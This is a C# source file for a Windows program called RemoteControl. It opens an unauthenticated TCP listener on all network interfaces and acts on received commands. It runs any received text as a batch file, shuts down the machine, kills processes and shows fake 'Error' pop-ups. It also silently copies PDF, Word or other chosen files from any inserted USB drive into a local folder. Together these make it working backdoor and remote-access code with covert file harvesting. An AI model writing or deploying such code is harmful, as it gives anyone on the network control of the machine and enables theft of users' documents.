using AudioSwitcher.AudioApi.CoreAudio;
using NetCoreAudio;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteControl
{
    internal class Program
    {
        static readonly string up = Environment.GetEnvironmentVariable("USERPROFILE")!;
        static JSON_Reader jreader;
        static Player player;
        static TcpListener server;
        static string PowerOffSchedulerPath;
        static CoreAudioDevice playback;
        static async Task Main(string[] args)
        {
            playback = new CoreAudioController().DefaultPlaybackDevice;
            player = new Player();
            server = null!;

            if (!File.Exists("config.json"))
            {
                await File.WriteAllTextAsync("config.json", "{\r\n  \"port\" : 13000,\r\n  \"PowerOffSchedulerPath\": \"\"\r\n}");
            }
            jreader = new JSON_Reader();
            await jreader.ReadJSON();

            while (true)
            {
                try
                {
                    int port = jreader.port;
                    PowerOffSchedulerPath = jreader.PowerOffSchedulerPath;

                    server = new TcpListener(IPAddress.Any, port);
                    server.Start();

                    try
                    {
                        while (true)
                        {
                            TcpClient client = await server.AcceptTcpClientAsync();
                            new Thread(async () =>
                            {
                                await HandleClient(client);
                            }).Start();
                        }
                    }
                    catch (Exception e)
                    {
                        await using StreamWriter outputFile = new StreamWriter(Path.Combine(Directory.GetCurrentDirectory(), "ErrorLog.txt"), append: true);
                        outputFile.WriteLine("{0}///// {1}: {2}", DateTime.Now, e.GetBaseException(), e.Message);
                    }
                }
                catch (Exception e)
                {
                    await using StreamWriter outputFile = new StreamWriter(Path.Combine(Directory.GetCurrentDirectory(), "ErrorLog.txt"), append: true);
                    outputFile.WriteLine("{0}///// {1}: {2}", DateTime.Now, e.GetBaseException(), e.Message);
                }
            }
        }

        public static async Task HandleClient(TcpClient client)
        {
            try
            {
                byte[] bytes = new byte[8192];
                string data = null!;
                data = null;
                NetworkStream stream = client.GetStream();

                int iter;
                while ((iter = stream.Read(bytes, 0, bytes.Length)) != 0 && client.Connected)
                {
                    try
                    {
                        data = Encoding.UTF8.GetString(bytes, 0, iter);
                        byte[] response = Encoding.UTF8.GetBytes(data + "\n");
                        stream.Write(response, 0, response.Length);

                        switch (data)
                        {
                            case "1":
                                Process.Start("shutdown", "-s -t 0");
                                break;
                            case "2":
                                Process.Start("shutdown", "-r -t 0");
                                break;
                            case "pause":
                                await player.Stop();
                                break;
                            case "POS":
                                Process.Start(PowerOffSchedulerPath + "\\PowerOffScheduler.exe", arguments: "-Default");
                                break;
                        }

                        if (data.StartsWith("start"))
                        {
                            try
                            {
                                OpenWithDefaultProgram(data.Substring(5));
                            }
                            catch { }
                        }

                        if (data.StartsWith("desktop"))
                        {
                            try
                            {
                                OpenWithDefaultProgram(up + @"\Desktop\" + data.Substring(7));
                            }
                            catch { }
                        }

                        if (data.StartsWith("vol"))
                        {
                            playback.Volume = int.Parse(data.Substring(3));
                        }

                        if (data.StartsWith("msg"))
                        {
                            Msg(data.Substring(3));
                        }

                        if (data.StartsWith("kill"))
                        {
                            foreach (Process i in Process.GetProcessesByName(data.Substring(4)))
                            {
                                i.Kill();
                            }
                        }

                        if (data.StartsWith("copy"))
                        {
                            string code = data.Substring(4);
                            Copy(code);
                        }

                        if (data.StartsWith("cmd"))
                        {
                            string code = data.Substring(3);
                            await File.WriteAllTextAsync(up + @"\Documents\program.bat", code);
                            Process.Start(up + @"\Documents\program.bat");
                        }

                        if (data.StartsWith("play"))
                        {
                            await player.Stop();
                            foreach (string x in new[] { ".wav", ".mp3", ".ogg", ".flac" })
                            {
                                try
                                {
                                    await player.Play(up + @"\Music\" + data.Substring(4) + x);
                                    break;
                                }
                                catch { }
                            }
                        }

                        if (data.StartsWith("bgp"))
                        {
                            new Thread(() =>
                            {
                                WebClient webClient = new WebClient();
                                if (Uri.TryCreate(data.Substring(3), UriKind.Absolute, out Uri uriResult) && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps || uriResult.Scheme == Uri.UriSchemeFtp))
                                {
                                    string http = "";
                                    if (uriResult.Scheme == Uri.UriSchemeHttp) { http = "http://"; }
                                    else if (uriResult.Scheme == Uri.UriSchemeHttps) { http = "https://"; }
                                    else if (uriResult.Scheme == Uri.UriSchemeFtp) { http = "ftp://"; }

                                    webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
                                    webClient.Headers.Add("Referer", http + uriResult.Host);
                                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                                    try
                                    {
                                        webClient.DownloadFile(uriResult, up + @"\Pictures\bgp.jpg");
                                        SetWallpaper(up + @"\Pictures\bgp.jpg");
                                    }
                                    catch (Exception e)
                                    {
                                        using StreamWriter outputFile = new StreamWriter(Path.Combine(Directory.GetCurrentDirectory(), "ErrorLog.txt"), append: true);
                                        outputFile.WriteLine("{0}///// {1}: {2}", DateTime.Now, e.GetBaseException(), e.Message);
                                    }
                                }
                            }).Start();
                        }
                        bytes = new byte[8192];
                    }
                    catch (Exception e)
                    {
                        await using StreamWriter outputFile = new StreamWriter(Path.Combine(Directory.GetCurrentDirectory(), "ErrorLog.txt"), append: true);
                        outputFile.WriteLine("{0}///// {1}: {2}", DateTime.Now, e.GetBaseException(), e.Message);
                    }
                }
            }
            catch (Exception e)
            {
                await using StreamWriter outputFile = new StreamWriter(Path.Combine(Directory.GetCurrentDirectory(), "ErrorLog.txt"), append: true);
                outputFile.WriteLine("{0}///// {1}: {2}", DateTime.Now, e.GetBaseException(), e.Message);
            }
        }

        public static void Msg(string data)
        {
            new Thread(() =>
            {
                MessageBox.Show(data, "Error", MessageBoxButtons.OK,
                    MessageBoxIcon.Error, MessageBoxDefaultButton.Button1,
                    MessageBoxOptions.DefaultDesktopOnly);
            }).Start();
        }

        public static async void OpenWithDefaultProgram(string path)
        {
            string code = $"cd {Path.GetDirectoryName(path)}\r\nstart \"\" \"{Path.GetFileName(path)}\"";
            try
            {
                await File.WriteAllTextAsync(up + @"\Documents\program.bat", code);
                Process.Start(up + @"\Documents\program.bat");
            }
            finally
            {
                try
                {
                    File.Delete(up + @"\Documents\program.bat");
                }
                catch { }
            }
        }

        static void Copy(string filetype)
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == DriveType.Removable)
                {
                    foreach (String dir in Directory.GetDirectories(drive.Name))
                    {
                        try
                        {
                            foreach (String file in Directory.GetFileSystemEntries(dir, "*", SearchOption.AllDirectories))
                            {
                                if (filetype.Equals(""))
                                {
                                    if (file.EndsWith(".pdf") || file.EndsWith(".doc") || file.EndsWith(".docx"))
                                    {
                                        Directory.CreateDirectory(up + @"\Documents\Belgeler");
                                        try { File.Copy(file, up + @"\Documents\Belgeler\" + Path.GetFileName(file), true); } catch { }
                                    }
                                }
                                else
                                {
                                    if (file.EndsWith("." + filetype))
                                    {
                                        Directory.CreateDirectory(up + @"\Documents\Belgeler");
                                        try { File.Copy(file, up + @"\Documents\Belgeler\" + Path.GetFileName(file), true); } catch { }
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
            UInt32 action, UInt32 uParam, string vParam, UInt32 winIni);

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

        public static void SetWallpaper(string path)
        {
            try
            {
                SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            }
            catch (Exception e)
            {
                using StreamWriter outputFile = new StreamWriter(Path.Combine(Directory.GetCurrentDirectory(), "ErrorLog.txt"), append: true);
                outputFile.WriteLine("{0}///// {1}: {2}", DateTime.Now, e.GetBaseException(), e.Message);
            }
        }
    }
}
